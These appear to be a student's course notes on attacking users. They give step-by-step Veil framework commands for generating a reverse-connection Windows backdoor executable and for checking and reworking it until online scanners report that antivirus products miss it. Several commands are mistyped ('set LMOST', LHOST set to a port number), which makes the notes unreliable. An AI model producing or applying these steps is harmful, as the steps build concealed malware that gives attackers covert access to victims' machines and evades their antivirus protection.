ATTACK ON USERS

90. Attack on User
***

1. Social Engineering - Gathering infos about a target inorder to make that target to do something for us

   NOW YOU CAN SEE THE DASHBOARD FOR VEIL

--------------------------------------------------------------------

92. Veil Overview
***
IN MAIN MENU :

1. In dashboard : cmds avail are - exit , info , list , update , use
2. $ list 
   # Two are available : evasion and ordnance
   # We are going to deal evasions to create backdoors

3. $ use 1 # because 1 is evasion here

   # Now we have got around 41 payloads avail , with that we can create backdoor
4. $ list # now list evasion
5. It lists payloads 
6. Ex : ruby/shellcode_inject/flat.py
         ruby/intrepreter/rev_https.py
         1st is program type
         2nd is Session type
         3rd is Connection type -> Bind and reverse

--------------------------------------------------------------------

93. Creating First Backdoor
***
1. NOW WITHIN THE DASHBOARD WE ARE LISTING THE evasion

2. IN THAT :
   $ use 14 # for example and 14 has lot of setups available
3. It contains the details of that 14th payload
4. Now you can see the required options

NOTE !!! : THESE TWO OPTIONS ARE MANDATORY TO SET
5. $ set LMOST 10.0.2.15 # my IP in NAT network and this varies according to the network
6. $ set LPORT 8080 # Now we set port from 80 to 8080

7. $ options # you can see the changes that we have done

8. OTHER THAN THESE OPTIONS WE CAN ALSO SET

9. BUT FOR NOW WE ARE READY TO CREATE OUR FIRST BACKDOOR

10. TO GENERATE BACKDOOR : 
    $ generate

11. IT asks for the base name for our exe file and you can enter a name and hit enter

12. NOW IT GENERATES BACKDOOR

13. It also says the locations for the created backdoor

14. NOW HIT ANY KEY ON THAT LOCATION DASHBOARD AND IT WILL BRING BACK TO OUR HOME DASHBOARD

15. NOW TRY TO FIND THE FILE USING YOUR FILE MANAGER GUI or ROOT

16. It is in usr/ of root
    usr/share/veil-output/compiled/file_name.exe

17. Now if we run this in our Windows machine it will create a vector/session by that we can connect to the device
 using kali linux

-------------------------------------------------------------------------

94. ByPassing AntiVirus Solutions
***
NOTE !!! : THIS SECTION IS FOR ->

1. We are going to see whether our Backdoor file bypasses our anitvirus software or not ( means it fakes the 
antivirus software without being caught )

2. Go Google : Online Virus Scanner without result distribution
   or Go : jotti.org ( But It shares the malware with the company of jotti however it works fine )

3. You can upload your .exe file there

4. This gives you the results from different antivirus solutions like K7 , Kaspersky etc...

5. Antivirus : Have algorithm that checks the pattern of virus and most of the times virus have same kind of pattern

6. In order to change the pattern : 
   GO : /opt/veil 
   $ python3 Veil.py
   # Goes for dashboard of Veil
   $ list
   $ evasion
   $ set LHOST 10.0.2.15
   $ set LHOST 8080
   $ set PROCESSORS
   $ set SLEEP 4
   $ options # you can see the changes that is beng done over there
   $ generate
      # Enter the name for the .exe file( payload ) 
      Tutor : lars_newpayload
      # Hit enter

   NOW THE FILE IS INSIDE THE usr/share/veil-output/compiled/file_name.exe

   NOW GO jotti.org : upload this file and see the results

   You can also change other program languages
